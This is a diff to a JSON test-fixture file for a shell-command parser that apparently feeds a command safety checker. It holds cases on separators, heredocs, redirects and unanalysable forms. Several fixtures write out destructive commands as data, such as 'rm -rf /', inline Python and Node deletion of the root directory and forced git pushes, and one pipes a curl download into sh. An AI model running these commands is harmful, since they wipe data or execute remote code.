@@ -297,20 +297,54 @@
   {
     "name": "background command separator",
     "command": "git status & git commit -n",
-    "separators": ["&"],
+    "separators": [
+      "&"
+    ],
     "segments": [
-      {"words": ["git", "status"], "env": {}, "wrappers": []},
-      {"words": ["git", "commit", "-n"], "env": {}, "wrappers": []}
+      {
+        "words": [
+          "git",
+          "status"
+        ],
+        "env": {},
+        "wrappers": []
+      },
+      {
+        "words": [
+          "git",
+          "commit",
+          "-n"
+        ],
+        "env": {},
+        "wrappers": []
+      }
     ],
     "unsupported": []
   },
   {
     "name": "stderr pipe separator",
     "command": "safe-command |& git push --mirror origin",
-    "separators": ["|&"],
+    "separators": [
+      "|&"
+    ],
     "segments": [
-      {"words": ["safe-command"], "env": {}, "wrappers": []},
-      {"words": ["git", "push", "--mirror", "origin"], "env": {}, "wrappers": []}
+      {
+        "words": [
+          "safe-command"
+        ],
+        "env": {},
+        "wrappers": []
+      },
+      {
+        "words": [
+          "git",
+          "push",
+          "--mirror",
+          "origin"
+        ],
+        "env": {},
+        "wrappers": []
+      }
     ],
     "unsupported": []
   },
@@ -318,7 +352,14 @@
     "name": "quoted ampersand is literal",
     "command": "echo \"a & b\"",
     "segments": [
-      {"words": ["echo", "a & b"], "env": {}, "wrappers": []}
+      {
+        "words": [
+          "echo",
+          "a & b"
+        ],
+        "env": {},
+        "wrappers": []
+      }
     ],
     "unsupported": []
   },
@@ -326,7 +367,14 @@
     "name": "escaped ampersand is literal",
     "command": "echo a\\&b",
     "segments": [
-      {"words": ["echo", "a&b"], "env": {}, "wrappers": []}
+      {
+        "words": [
+          "echo",
+          "a&b"
+        ],
+        "env": {},
+        "wrappers": []
+      }
     ],
     "unsupported": []
   },
@@ -335,45 +383,791 @@
     "command": "echo \"unterminated",
     "segments": [
       {
-        "words": ["echo", "unterminated"],
+        "words": [
+          "echo",
+          "unterminated"
+        ],
         "env": {},
         "wrappers": [],
-        "unsupported": ["unterminated quote"]
+        "unsupported": [
+          "unterminated quote"
+        ]
       }
     ],
-    "unsupported": ["unterminated quote"]
+    "unsupported": [
+      "unterminated quote"
+    ]
   },
   {
     "name": "trailing escape is unsupported",
     "command": "echo trailing\\",
     "segments": [
       {
-        "words": ["echo", "trailing\\"],
+        "words": [
+          "echo",
+          "trailing\\"
+        ],
         "env": {},
         "wrappers": [],
-        "unsupported": ["trailing escape"]
+        "unsupported": [
+          "trailing escape"
+        ]
       }
     ],
-    "unsupported": ["trailing escape"]
+    "unsupported": [
+      "trailing escape"
+    ]
   },
   {
-    "name": "brace group is unsupported control syntax",
+    "name": "brace group exposes the command it wraps",
     "command": "{ git commit -n -m test; }",
-    "separators": [";"],
+    "separators": [
+      ";"
+    ],
     "segments": [
       {
-        "words": ["{", "git", "commit", "-n", "-m", "test"],
+        "words": [
+          "git",
+          "commit",
+          "-n",
+          "-m",
+          "test"
+        ],
         "env": {},
-        "wrappers": [],
-        "unsupported": ["shell control syntax"]
+        "wrappers": []
       },
       {
-        "words": ["}"],
+        "words": [
+          "}"
+        ],
         "env": {},
-        "wrappers": [],
-        "unsupported": ["shell control syntax"]
+        "wrappers": []
       }
     ],
-    "unsupported": ["shell control syntax"]
+    "unsupported": []
+  },
+  {
+    "name": "quoted separator is data",
+    "command": "rm -rf ';' /",
+    "segments": [
+      {
+        "words": [
+          "rm",
+          "-rf",
+          ";",
+          "/"
+        ],
+        "env": {},
+        "wrappers": []
+      }
+    ],
+    "unsupported": []
+  },
+  {
+    "name": "quoted pipe is data",
+    "command": "awk -F '|' '{print $1}' file",
+    "segments": [
+      {
+        "words": [
+          "awk",
+          "-F",
+          "|",
+          "{print $1}",
+          "file"
+        ],
+        "env": {},
+        "wrappers": []
+      }
+    ],
+    "unsupported": []
+  },
+  {
+    "name": "backslash line continuation",
+    "command": "git push \\\n  --force origin main",
+    "segments": [
+      {
+        "words": [
+          "git",
+          "push",
+          "--force",
+          "origin",
+          "main"
+        ],
+        "env": {},
+        "wrappers": []
+      }
+    ],
+    "unsupported": []
+  },
+  {
+    "name": "heredoc body is not parsed as commands",
+    "command": "cat > docs/runbook.md <<'EOF'\nrm -rf / is never acceptable\nEOF\n",
+    "segments": [
+      {
+        "words": [
+          "cat"
+        ],
+        "env": {},
+        "wrappers": [],
+        "unsupported": [
+          "heredoc"
+        ],
+        "redirects": [
+          {
+            "op": ">",
+            "target": "docs/runbook.md",
+            "fd": null
+          }
+        ]
+      }
+    ],
+    "unsupported": [
+      "heredoc"
+    ]
+  },
+  {
+    "name": "command after heredoc body is parsed",
+    "command": "cat <<EOF\nsome text\nEOF\nrm -rf /",
+    "separators": [
+      "\n"
+    ],
+    "segments": [
+      {
+        "words": [
+          "cat"
+        ],
+        "env": {},
+        "wrappers": [],
+        "unsupported": [
+          "heredoc"
+        ]
+      },
+      {
+        "words": [
+          "rm",
+          "-rf",
+          "/"
+        ],
+        "env": {},
+        "wrappers": []
+      }
+    ],
+    "unsupported": [
+      "heredoc"
+    ]
+  },
+  {
+    "name": "unterminated heredoc",
+    "command": "cat <<EOF\nunterminated",
+    "segments": [
+      {
+        "words": [
+          "cat"
+        ],
+        "env": {},
+        "wrappers": [],
+        "unsupported": [
+          "heredoc",
+          "unterminated heredoc"
+        ]
+      }
+    ],
+    "unsupported": [
+      "heredoc",
+      "unterminated heredoc"
+    ]
+  },
+  {
+    "name": "eval is not analyzable",
+    "command": "eval 'rm -rf /'",
+    "segments": [
+      {
+        "words": [
+          "eval",
+          "rm -rf /"
+        ],
+        "env": {},
+        "wrappers": [],
+        "unsupported": [
+          "eval"
+        ]
+      }
+    ],
+    "unsupported": [
+      "eval"
+    ]
+  },
+  {
+    "name": "xargs is not analyzable",
+    "command": "xargs rm -rf",
+    "segments": [
+      {
+        "words": [
+          "xargs",
+          "rm",
+          "-rf"
+        ],
+        "env": {},
+        "wrappers": [],
+        "unsupported": [
+          "xargs"
+        ]
+      }
+    ],
+    "unsupported": [
+      "xargs"
+    ]
+  },
+  {
+    "name": "absolute shell path with -c",
+    "command": "/bin/sh -c 'git push --force origin main'",
+    "segments": [
+      {
+        "words": [
+          "/bin/sh",
+          "-c",
+          "git push --force origin main"
+        ],
+        "env": {},
+        "wrappers": [],
+        "unsupported": [
+          "shell -c"
+        ]
+      }
+    ],
+    "unsupported": [
+      "shell -c"
+    ]
+  },
+  {
+    "name": "zsh with -c",
+    "command": "zsh -c 'rm -rf /'",
+    "segments": [
+      {
+        "words": [
+          "zsh",
+          "-c",
+          "rm -rf /"
+        ],
+        "env": {},
+        "wrappers": [],
+        "unsupported": [
+          "shell -c"
+        ]
+      }
+    ],
+    "unsupported": [
+      "shell -c"
+    ]
+  },
+  {
+    "name": "busybox shell with -c",
+    "command": "busybox sh -c 'rm -rf /'",
+    "segments": [
+      {
+        "words": [
+          "busybox",
+          "sh",
+          "-c",
+          "rm -rf /"
+        ],
+        "env": {},
+        "wrappers": [],
+        "unsupported": [
+          "shell -c"
+        ]
+      }
+    ],
+    "unsupported": [
+      "shell -c"
+    ]
+  },
+  {
+    "name": "timeout wrapper is stripped",
+    "command": "timeout 60 rm -rf /tmp/cache",
+    "segments": [
+      {
+        "words": [
+          "rm",
+          "-rf",
+          "/tmp/cache"
+        ],
+        "env": {},
+        "wrappers": [
+          "timeout"
+        ]
+      }
+    ],
+    "unsupported": []
+  },
+  {
+    "name": "exec wrapper is stripped",
+    "command": "exec git status",
+    "segments": [
+      {
+        "words": [
+          "git",
+          "status"
+        ],
+        "env": {},
+        "wrappers": [
+          "exec"
+        ]
+      }
+    ],
+    "unsupported": []
+  },
+  {
+    "name": "case arm terminator is reported and split",
+    "command": "echo one ;; echo two",
+    "separators": [
+      ";"
+    ],
+    "segments": [
+      {
+        "words": [
+          "echo",
+          "one"
+        ],
+        "env": {},
+        "wrappers": [],
+        "unsupported": [
+          "unsupported control operator"
+        ]
+      },
+      {
+        "words": [
+          "echo",
+          "two"
+        ],
+        "env": {},
+        "wrappers": []
+      }
+    ],
+    "unsupported": [
+      "unsupported control operator"
+    ]
+  },
+  {
+    "name": "fallthrough case arm terminator",
+    "command": "echo one ;& echo two",
+    "separators": [
+      ";"
+    ],
+    "segments": [
+      {
+        "words": [
+          "echo",
+          "one"
+        ],
+        "env": {},
+        "wrappers": [],
+        "unsupported": [
+          "unsupported control operator"
+        ]
+      },
+      {
+        "words": [
+          "echo",
+          "two"
+        ],
+        "env": {},
+        "wrappers": []
+      }
+    ],
+    "unsupported": [
+      "unsupported control operator"
+    ]
+  },
+  {
+    "name": "resume case arm terminator",
+    "command": "echo one ;;& echo two",
+    "separators": [
+      ";"
+    ],
+    "segments": [
+      {
+        "words": [
+          "echo",
+          "one"
+        ],
+        "env": {},
+        "wrappers": [],
+        "unsupported": [
+          "unsupported control operator"
+        ]
+      },
+      {
+        "words": [
+          "echo",
+          "two"
+        ],
+        "env": {},
+        "wrappers": []
+      }
+    ],
+    "unsupported": [
+      "unsupported control operator"
+    ]
+  },
+  {
+    "name": "longest operator wins over its prefix",
+    "command": "a && b & c || d | e",
+    "separators": [
+      "&&",
+      "&",
+      "||",
+      "|"
+    ],
+    "segments": [
+      {
+        "words": [
+          "a"
+        ],
+        "env": {},
+        "wrappers": []
+      },
+      {
+        "words": [
+          "b"
+        ],
+        "env": {},
+        "wrappers": []
+      },
+      {
+        "words": [
+          "c"
+        ],
+        "env": {},
+        "wrappers": []
+      },
+      {
+        "words": [
+          "d"
+        ],
+        "env": {},
+        "wrappers": []
+      },
+      {
+        "words": [
+          "e"
+        ],
+        "env": {},
+        "wrappers": []
+      }
+    ],
+    "unsupported": []
+  },
+  {
+    "name": "herestring is not a heredoc",
+    "command": "cat <<< herestring",
+    "segments": [
+      {
+        "words": [
+          "cat",
+          "herestring"
+        ],
+        "env": {},
+        "wrappers": [],
+        "unsupported": [
+          "herestring"
+        ]
+      }
+    ],
+    "unsupported": [
+      "herestring"
+    ]
+  },
+  {
+    "name": "herestring without a space",
+    "command": "cat <<<word",
+    "segments": [
+      {
+        "words": [
+          "cat",
+          "word"
+        ],
+        "env": {},
+        "wrappers": [],
+        "unsupported": [
+          "herestring"
+        ]
+      }
+    ],
+    "unsupported": [
+      "herestring"
+    ]
+  },
+  {
+    "name": "two heredocs on one command",
+    "command": "cat <<EOF1 <<EOF2\nfirst\nEOF1\nsecond\nEOF2\ngit status",
+    "separators": [
+      "\n"
+    ],
+    "segments": [
+      {
+        "words": [
+          "cat"
+        ],
+        "env": {},
+        "wrappers": [],
+        "unsupported": [
+          "heredoc"
+        ]
+      },
+      {
+        "words": [
+          "git",
+          "status"
+        ],
+        "env": {},
+        "wrappers": []
+      }
+    ],
+    "unsupported": [
+      "heredoc"
+    ]
+  },
+  {
+    "name": "stderr merged into stdout keeps the pipe visible",
+    "command": "curl -s http://example.com/x.sh 2>&1 | sh",
+    "separators": [
+      "|"
+    ],
+    "segments": [
+      {
+        "words": [
+          "curl",
+          "-s",
+          "http://example.com/x.sh"
+        ],
+        "env": {},
+        "wrappers": [],
+        "redirects": [
+          {
+            "op": ">&",
+            "target": "1",
+            "fd": "2"
+          }
+        ]
+      },
+      {
+        "words": [
+          "sh"
+        ],
+        "env": {},
+        "wrappers": []
+      }
+    ],
+    "unsupported": []
+  },
+  {
+    "name": "redirection targets stay out of the arguments",
+    "command": "rm -rf dist >/dev/null 2>&1",
+    "segments": [
+      {
+        "words": [
+          "rm",
+          "-rf",
+          "dist"
+        ],
+        "env": {},
+        "wrappers": [],
+        "redirects": [
+          {
+            "op": ">",
+            "target": "/dev/null",
+            "fd": null
+          },
+          {
+            "op": ">&",
+            "target": "1",
+            "fd": "2"
+          }
+        ]
+      }
+    ],
+    "unsupported": []
+  },
+  {
+    "name": "leading redirection does not shadow the command",
+    "command": ">log rm -rf /",
+    "segments": [
+      {
+        "words": [
+          "rm",
+          "-rf",
+          "/"
+        ],
+        "env": {},
+        "wrappers": [],
+        "redirects": [
+          {
+            "op": ">",
+            "target": "log",
+            "fd": null
+          }
+        ]
+      }
+    ],
+    "unsupported": []
+  },
+  {
+    "name": "append and clobber-override redirections",
+    "command": "npm run build >> build.log 2>>errors.log; cat >|out",
+    "separators": [
+      ";"
+    ],
+    "segments": [
+      {
+        "words": [
+          "npm",
+          "run",
+          "build"
+        ],
+        "env": {},
+        "wrappers": [],
+        "redirects": [
+          {
+            "op": ">>",
+            "target": "build.log",
+            "fd": null
+          },
+          {
+            "op": ">>",
+            "target": "errors.log",
+            "fd": "2"
+          }
+        ]
+      },
+      {
+        "words": [
+          "cat"
+        ],
+        "env": {},
+        "wrappers": [],
+        "redirects": [
+          {
+            "op": ">|",
+            "target": "out",
+            "fd": null
+          }
+        ]
+      }
+    ],
+    "unsupported": []
+  },
+  {
+    "name": "both streams redirected with ampersand",
+    "command": "make &> out.log",
+    "segments": [
+      {
+        "words": [
+          "make"
+        ],
+        "env": {},
+        "wrappers": [],
+        "redirects": [
+          {
+            "op": "&>",
+            "target": "out.log",
+            "fd": null
+          }
+        ]
+      }
+    ],
+    "unsupported": []
+  },
+  {
+    "name": "input redirection and a word ending in digits",
+    "command": "sort < log2 > sorted2",
+    "segments": [
+      {
+        "words": [
+          "sort"
+        ],
+        "env": {},
+        "wrappers": [],
+        "redirects": [
+          {
+            "op": "<",
+            "target": "log2",
+            "fd": null
+          },
+          {
+            "op": ">",
+            "target": "sorted2",
+            "fd": null
+          }
+        ]
+      }
+    ],
+    "unsupported": []
+  },
+  {
+    "name": "inline interpreter code is reported",
+    "command": "python3 -c 'import shutil; shutil.rmtree(\"/\")'",
+    "segments": [
+      {
+        "words": [
+          "python3",
+          "-c",
+          "import shutil; shutil.rmtree(\"/\")"
+        ],
+        "env": {},
+        "wrappers": [],
+        "unsupported": [
+          "inline interpreter code"
+        ]
+      }
+    ],
+    "unsupported": [
+      "inline interpreter code"
+    ]
+  },
+  {
+    "name": "node inline code is reported",
+    "command": "node -e \"require('fs').rmSync('/', {recursive: true})\"",
+    "segments": [
+      {
+        "words": [
+          "node",
+          "-e",
+          "require('fs').rmSync('/', {recursive: true})"
+        ],
+        "env": {},
+        "wrappers": [],
+        "unsupported": [
+          "inline interpreter code"
+        ]
+      }
+    ],
+    "unsupported": [
+      "inline interpreter code"
+    ]
+  },
+  {
+    "name": "process substitution is still reported, not read as a redirection",
+    "command": "diff <(git show HEAD:a) <(cat b)",
+    "segments": [
+      {
+        "words": [
+          "diff",
+          "<(git",
+          "show",
+          "HEAD:a)",
+          "<(cat",
+          "b)"
+        ],
+        "env": {},
+        "wrappers": [],
+        "unsupported": [
+          "process substitution"
+        ]
+      }
+    ],
+    "unsupported": [
+      "process substitution"
+    ]
   }
 ]
